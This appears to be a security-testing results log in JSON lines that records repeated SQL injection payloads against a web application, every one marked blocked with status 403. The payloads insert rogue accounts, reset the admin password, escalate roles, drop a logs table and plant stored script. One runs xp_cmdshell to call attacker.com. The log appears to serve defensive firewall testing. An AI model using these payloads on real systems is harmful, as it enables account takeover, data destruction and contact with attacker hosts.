+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033545039987075143}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00293134600360645}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035327579971635714}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034738660033326596}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032654810056556016}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004164792000665329}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037092810016474687}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003623825999966357}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004280688001017552}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003522550003253855}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004131408997636754}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006357227997796144}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004314461999456398}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004892340999504086}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004176498994638678}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038079320001997985}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032261419983115047}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036814970007981174}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004376412995043211}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004728904998046346}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004098475001228508}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003479765997326467}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032524070047657005}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003958493995014578}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033873379943543114}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005296604002069216}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003723037996678613}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003349674996570684}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036910460039507598}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038942480023251846}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004169662999629509}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003285070000856649}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003119938999589067}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035419380001258105}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049155610031448305}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00492415799817536}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004552324004180264}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003983472000982147}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003869576998113189}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003939129994250834}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00345690299582202}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003700760003994219}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003103848001046572}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032374279981013387}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003263067002990283}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034037100049317814}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003772634001506958}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032878749989322387}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031050609977683052}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003132067999104038}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004534447994956281}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006141390003904235}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005536789998586755}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005372961000830401}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004417822005052585}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004443233003257774}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003882336000970099}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037125680028111674}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037284069985616952}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00407484400057001}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004882177003310062}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044077179991290905}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038778210000600666}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004188081999018323}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00572312599979341}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004089296999154612}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003719450003700331}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005069394996098708}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005499835999216884}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037317249953048304}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00384615600341931}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004119797005841974}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036200190006638877}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004332037999120075}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004251952006598003}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004030903997772839}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033165909990202636}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035106659997836687}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003999423002824187}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003941278999263886}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005087010002171155}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040775179950287566}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042806630008271895}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00469927800440928}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004008089999842923}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034965399972861633}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031893229970592074}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003378671004611533}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00366969400056405}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003432685996813234}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003288136998889968}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003024413999810349}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003213741998479236}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034464630007278174}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003066795994527638}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003499559999909252}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030892200011294335}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032243219975498505}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003302885001176037}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003266883999458514}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040815120009938255}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003908696999133099}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00430016900645569}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00548852099746}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003998551997938193}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038437799958046526}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003546567000739742}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003666378994239494}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034781040012603626}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00498914800118655}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005132045000209473}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038150210020830855}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037080839974805713}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035563970013754442}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0062837750010658056}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005003320999094285}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038603299981332384}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005976298998575658}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005399923997174483}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005087519995868206}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005094141000881791}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005334417000995018}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043300440011080354}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038280620065052062}
